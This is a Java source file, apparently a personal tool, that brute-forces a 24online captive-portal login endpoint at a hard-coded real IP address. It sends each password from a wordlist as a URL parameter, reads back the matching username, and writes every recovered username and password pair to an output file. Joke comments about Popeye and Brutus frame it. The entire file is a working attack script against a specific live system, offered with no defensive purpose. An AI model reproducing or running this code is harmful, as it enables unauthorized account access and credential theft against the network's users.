import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.DomElement;
import com.gargoylesoftware.htmlunit.html.DomNodeList;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.javascript.host.html.HTMLCollection;
import com.gargoylesoftware.htmlunit.javascript.host.xml.XMLDocument;
import com.gargoylesoftware.htmlunit.xml.XmlPage;
import org.jsoup.nodes.Document;

import java.io.*;
import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;

/**
 * Created by vyomkeshjha on 07/04/16.
 */
public class Brute
{
    /***
     * I am popeye the sailor man
     * This code is to find olive, as brutus has kidnapped her
     * Read the password file
     * URL=http://1.186.15.77/24online/servlet/AjaxManager?mode=2000&nasip=1.186.15.78&password
     *
     * Read some try some approach
     */

    String URLstring = "http://1.186.15.77/24online/servlet/AjaxManager?mode=2000&nasip=1.186.15.78&password=";
    String FileName="Pwd.txt";
    ArrayList<String> passList;
    String[] Tokens;
    String username;
    Hashtable<String,String> userPassMap;
    String fileOut="output.txt";

    Brute()
    {
         passList= new ArrayList<String>();
         userPassMap = new Hashtable<String, String>();

    }
    private String createUrlString(String password)
    {
        String completeString = URLstring+password;
        return completeString;
    }

    void makeUrlAndGet()
    {

        for (int i=0;i<passList.size();i++)
        {
            String finalString = URLstring+passList.get(i);
          //  System.out.println(finalString);

            try (final WebClient webClient = new WebClient())
            {
                final XmlPage page = webClient.getPage(finalString);


               // System.out.println("page "+page.asXml());

                username=page.getElementsByTagName("username").get(0).getTextContent();
                String passcode =passList.get(i);
                String Cred="username = "+username+" passcode="+passcode+"\n";
                System.out.println(Cred);
                Writer(Cred,true);
               //DomNodeList<DomElement> DomList= page.getElementsByTagName("username");
               // System.out.println(DomList.get(0));

            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            catch (IndexOutOfBoundsException ex)
            {
               // System.out.println("index out");
            }
        }
        passList.clear();
    }
   void populateListFromFileThenTry()
   {
       String line;

       try {

           FileReader fileReader = new FileReader(FileName);
           BufferedReader Reader = new BufferedReader(fileReader); //wrapping it in it
        int counter =1;

           while (((line=Reader.readLine()) != null)&&counter>0) {
               passList.add(line);
               //System.out.println(line);
               counter--;
               if(counter==0)
               {
              //     System.out.println("counter hit zero");
                   counter=1;
                   makeUrlAndGet();
               }
           }
           Reader.close();

        System.out.println(passList);
       } catch (FileNotFoundException ex)
       {
           System.out.println(
                   "Unable to open file sucker '"
                           + FileName + "'" +"    ");
       } catch (IOException ex) {
           System.out.println(
                   "Error reading file '"
                           + FileName + "'");
       }
       catch(Exception e){
           System.out.println("exception is "+e.toString());
       }
   }

    public void printTokens(String[] tokens) {
        for (int k = 0; k < tokens.length; k++) {
            System.out.println(tokens[k]);

        }}


    public void Writer(String argToWrite, boolean APPEND) {
        try {

            FileWriter write = new FileWriter(fileOut, APPEND);
            BufferedWriter Bwrite = new BufferedWriter(write);
            Bwrite.append(argToWrite);
        //    System.out.println("appending complete...");
            Bwrite.close();

        } catch (IOException e) {
            System.out.println("File Not Found");
        }
    }
    public static void main(String... args)
    {
        Brute brutus = new Brute();
        brutus.populateListFromFileThenTry();
    }
}